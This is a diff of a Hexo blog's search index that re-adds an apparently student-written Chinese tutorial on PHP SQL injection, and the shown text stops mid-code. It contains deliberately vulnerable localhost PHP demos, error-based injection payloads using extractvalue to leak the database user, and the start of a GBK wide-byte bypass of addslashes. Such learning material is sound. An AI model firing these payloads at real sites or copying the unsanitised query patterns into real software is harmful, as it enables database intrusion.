@@ -1,144 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Funcky_Night</title>
-    <url>/rustymoon/2023/10/28/Funcky-Night/</url>
-    <content><![CDATA[<p>随手起的名字，只是忽然想起来在几首歌里都听过这个funcky。</p>
-]]></content>
-      <tags>
-        <tag>ORN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP_SQL-Injection</title>
-    <url>/rustymoon/2023/11/20/PHP-SQL-Injection/</url>
-    <content><![CDATA[<p>有点好久不见，之前在入门之处学的第一个就是这个漏洞，不过那个时候学的是漏洞，没有涉及到专门分语言的。</p>
-<span id="more"></span>
-
-<h1 id="SQL-Injection-原理"><a href="#SQL-Injection-原理" class="headerlink" title="SQL Injection 原理"></a>SQL Injection 原理</h1><blockquote>
-<p>将恶意SQL语句注入到Web表单的输入页面中，该恶意SQL语句会导致原有的SQL语句发生改变，从而达到攻击者的目的去让它去执行一些危险的数据操作。</p>
-</blockquote>
-<p>简单说，所有涉及到的数据库的 <strong>增删改查</strong> 操作的功能点都有可能存在SQL Injection。</p>
-<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><img src="/rustymoon/2023/11/20/PHP-SQL-Injection/SQL-Injection.png" class title="SQL注入分类">
-
-<p>之前单独学习的时候，只学到报错注入、盲注、堆叠注入，就觉得OMG怎么这么难，堪比现在的我面对数电实验之4位并行加法器。</p>
-<h1 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h1><p>在开始之前，先搞好配置吧。</p>
-<p>phptorm + XAMPP</p>
-<p>有phpstorm最好，没有的请有phpstudy或者XAMPP之类工具（有phpstorm也要有当然如果你自己本地有php就不需要了）。</p>
-<p>参考一下：</p>
-<ul>
-<li><p><a href="https://cloud.tencent.com/developer/article/1739540">phpstorm运行本地php文件</a></p>
-</li>
-<li><p><a href="https://www.runoob.com/php/php-mysql-insert.html">php连接MySQL</a></p>
-</li>
-<li><p><a href="https://c.biancheng.net/view/2625.html">MySQL Workbench基本使用</a>（如果有安装MySQL的话……没有也没事，XAMPP或者phpstudy自带）</p>
-</li>
-</ul>
-<p>然后写了一个测试php：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
-<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
-<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Flask08"</span><span class="token punctuation">;</span>
-<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
-
-<span class="token comment">// 创建链接</span>
-<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">// 检查链接</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO user (username, email, password,  id)
-VALUES ('Lisa', 'lias@example.com', 'fdaggsd' , 3);"</span><span class="token punctuation">;</span>
-
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"新记录插入成功"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>测试结果：</p>
-<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/test.png" class title="连接测试">
-
-<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/inser.png" class title="插入数据">
-
-<p>(尝试使用muti_query不知道为什么出错了，感觉可能又是php版本不兼容，我的是5.6)</p>
-<hr>
-<p><a href="https://stackoverflow.com/questions/11448068/mysql-error-code-1175-during-update-in-mysql-workbench">尝试用SQL语句在Workbench中删除记录时遇到的一个问题以及解决方法</a></p>
-<hr>
-<hr>
-
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><table><tr><td bgcolor="yellow">条件:</td></tr></table>
-
-<ul>
-<li>对传入的参数 <strong>未做过滤</strong> 直接拼接到SQL语句中执行</li>
-<li>直接使用<code>mysqli_error()</code>进行报错处理且没有对报错信息进行良好的处理</li>
-</ul>
-<p>测试demo</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/heml;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
-    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
-    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"F01"</span><span class="token punctuation">;</span>
-    <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
-
-    <span class="token comment">// 创建链接</span>
-    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment">// 检查链接</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM user WHERE id-'<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$row</span><span class="token operator">=</span>@<span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your name is: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your psw: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>进行正常测试：</p>
-<p><code>http://localhost:63342/demo/error.php?id=1</code></p>
-<p>返回：</p>
-<p><code>Your name is: Amy&lt;br&gt;your psw: sfggregea</code></p>
-<p>如果进行错误测试：</p>
-<p><code>http://localhost:63342/demo/error.php?id=1&#39;</code></p>
-<p>报错：</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&lt;br />
-&lt;b>Fatal error&lt;/b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 in C:\Users\fk\PhpstormProjects\demo\error.php:17
-
-Stack trace:
-#0 C:\Users\fk\PhpstormProjects\demo\error.php(17): mysqli_query(Object(mysqli), 'SELECT * FROM u...')//出现表名
-
-#1 &#123;main&#125;
-  thrown in &lt;b>C:\Users\fk\PhpstormProjects\demo\error.php&lt;/b> on line &lt;b>17&lt;/b>&lt;br /><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>其实看第一段的<code>near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>就行，一个报错注入就可以出现雏形。</p>
-<p>在按部就班的测试之后就可以构造payload：<code>http://localhost:63342/demo/error.php?id=1%27%20and%20(select%20extractvalue(%22anything%22,concat(%27~%27,(user()))))%20--%20qwe</code></p>
-<p>就可以通过报错回显得到：<code>XPATH syntax error: &#39;~root@localhost&#39;</code></p>
-]]></content>
-      <tags>
-        <tag>LEARN</tag>
-        <tag>PHP</tag>
-        <tag>SQL-Injection</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP_SSRF</title>
     <url>/rustymoon/2023/11/13/PHP-SSRF/</url>
     <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF–服务端请求伪造</strong></p>
@@ -305,29 +167,230 @@ Stack trace:
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/rustymoon/2023/10/28/hello-world/</url>
-    <content><![CDATA[<p>More info: <a href="https://hexo.io/docs">Deployment</a></p>
-]]></content>
+    <title>PHP_SQL-Injection</title>
+    <url>/rustymoon/2023/11/20/PHP-SQL-Injection/</url>
+    <content><![CDATA[<p>有点好久不见，之前在入门之处学的第一个就是这个漏洞，不过那个时候学的是漏洞，没有涉及到专门分语言的。</p>
+<span id="more"></span>
+
+<h1 id="SQL-Injection-原理"><a href="#SQL-Injection-原理" class="headerlink" title="SQL Injection 原理"></a>SQL Injection 原理</h1><blockquote>
+<p>将恶意SQL语句注入到Web表单的输入页面中，该恶意SQL语句会导致原有的SQL语句发生改变，从而达到攻击者的目的去让它去执行一些危险的数据操作。</p>
+</blockquote>
+<p>简单说，所有涉及到的数据库的 <strong>增删改查</strong> 操作的功能点都有可能存在SQL Injection。</p>
+<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><img src="/rustymoon/2023/11/20/PHP-SQL-Injection/SQL-Injection.png" class title="SQL注入分类">
+
+<p>之前单独学习的时候，只学到报错注入、盲注、堆叠注入，就觉得OMG怎么这么难，堪比现在的我面对数电实验之4位并行加法器。</p>
+<h1 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h1><p>在开始之前，先搞好配置吧。</p>
+<p>phptorm + XAMPP</p>
+<p>有phpstorm最好，没有的请有phpstudy或者XAMPP之类工具（有phpstorm也要有当然如果你自己本地有php就不需要了）。</p>
+<p>参考一下：</p>
+<ul>
+<li><p><a href="https://cloud.tencent.com/developer/article/1739540">phpstorm运行本地php文件</a></p>
+</li>
+<li><p><a href="https://www.runoob.com/php/php-mysql-insert.html">php连接MySQL</a></p>
+</li>
+<li><p><a href="https://c.biancheng.net/view/2625.html">MySQL Workbench基本使用</a>（如果有安装MySQL的话……没有也没事，XAMPP或者phpstudy自带）</p>
+</li>
+</ul>
+<p>然后写了一个测试php：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Flask08"</span><span class="token punctuation">;</span>
+<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 创建链接</span>
+<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// 检查链接</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO user (username, email, password,  id)
+VALUES ('Lisa', 'lias@example.com', 'fdaggsd' , 3);"</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"新记录插入成功"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>测试结果：</p>
+<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/test.png" class title="连接测试">
+
+<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/inser.png" class title="插入数据">
+
+<p>(尝试使用muti_query不知道为什么出错了，感觉可能又是php版本不兼容，我的是5.6)</p>
+<hr>
+<p><a href="https://stackoverflow.com/questions/11448068/mysql-error-code-1175-during-update-in-mysql-workbench">尝试用SQL语句在Workbench中删除记录时遇到的一个问题以及解决方法</a></p>
+<hr>
+<hr>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="mysqli-error"><a href="#mysqli-error" class="headerlink" title="mysqli_error()"></a>mysqli_error()</h3><table><tr><td bgcolor="yellow">条件:</td></tr></table>
+
+<ul>
+<li>对传入的参数 <strong>未做过滤</strong> 直接拼接到SQL语句中执行</li>
+<li>直接使用<code>mysqli_error()</code>进行报错处理且没有对报错信息进行良好的处理</li>
+</ul>
+<p>测试demo</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/heml;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
+    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"F01"</span><span class="token punctuation">;</span>
+    <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 创建链接</span>
+    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 检查链接</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM user WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment">//惊为天人的是，这里我把id=打错成了id-，但是依旧有效运行</span>
+    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$row</span><span class="token operator">=</span>@<span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your name is: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your psw: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里也有一个mysqli_errno()函数，当时可能没注意直接回车……但依旧有效……</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>进行正常测试：</p>
+<p><code>http://localhost:63342/demo/error.php?id=1</code></p>
+<p>返回：</p>
+<p><code>Your name is: John&lt;br&gt;your psw: daidgiaegigak</code><br><code>Your name is: Amy&lt;br&gt;your psw: sfggregea</code></p>
+<p>如果进行错误测试：</p>
+<p><code>http://localhost:63342/demo/error.php?id=1&#39;</code></p>
+<p>报错：</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&lt;br />
+&lt;b>Fatal error&lt;/b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 in C:\Users\fk\PhpstormProjects\demo\error.php:17
+
+Stack trace:
+#0 C:\Users\fk\PhpstormProjects\demo\error.php(17): mysqli_query(Object(mysqli), 'SELECT * FROM u...')//出现表名
+
+#1 &#123;main&#125;
+  thrown in &lt;b>C:\Users\fk\PhpstormProjects\demo\error.php&lt;/b> on line &lt;b>17&lt;/b>&lt;br /><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+<br>
+
+<p>其实看第一段的<code>near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>就行，一个报错注入就可以出现雏形。</p>
+<p><code>id=1&#39; or 1=1--+</code>就正常输出，回头去看源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//...</span>
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<p><code>id=1&#39;</code>相当于<code>$id=$_GET[&#39;1&#39;&#39;]</code>。<br><code>id=1&#39; or 1=2 --+</code>相当于<code>&#39;1&#39; or 1=2--+&#39;</code>即<code>$_GET[&#39;1&#39; or 1=2]</code></p>
+<br>
+<br>
+
+<p>一点简单的测试之后，</p>
+<br>
+<br>
+
+<p>在按部就班的测试之后就可以构造payload：<br><code>http://demo/error.php?id=1%27%20and%20(select%20extractvalue(%22anything%22,concat(%27~%27,(user()))))%20--%20qwe</code></p>
+<p>就可以通过报错回显得到：<code>XPATH syntax error: &#39;~root@localhost&#39;</code></p>
+<hr>
+
+<p>一个番外，当我不小心把那个单引号打成中文单引号，就无事发生——没有报错，依旧正常输出。<br>具体原因，tbc。</p>
+<hr>
+<hr>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>mysql的gbk编码是多字节编码，两个字节代表一个汉字，<code>%df</code> + <code>\</code>会组成一个汉字，所以利用这个特性进行<code>&#39;</code>的逃逸，构成sql注入。</p>
+<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>该函数对预定义的字符进行 前加\ 操作</p>
+<p><strong>预定义的字符</strong>：</p>
+<ul>
+<li><p>单引号</p>
+</li>
+<li><p>双引号</p>
+</li>
+<li><p>反斜杠</p>
+</li>
+<li><p>NULL</p>
+</li>
+</ul>
+<hr>
+
+<p>进行测试</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//testdemo
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/heml;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
+    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
+    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Flaskon0801"</span><span class="token punctuation">;</span>
+    <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 创建链接</span>
+    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"SET NAMES 'gbk'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置MySQL字符编码为gbk</span>
+    <span class="token comment">// 检查链接</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//$id=$_GET['id'];</span>
+    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM user WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
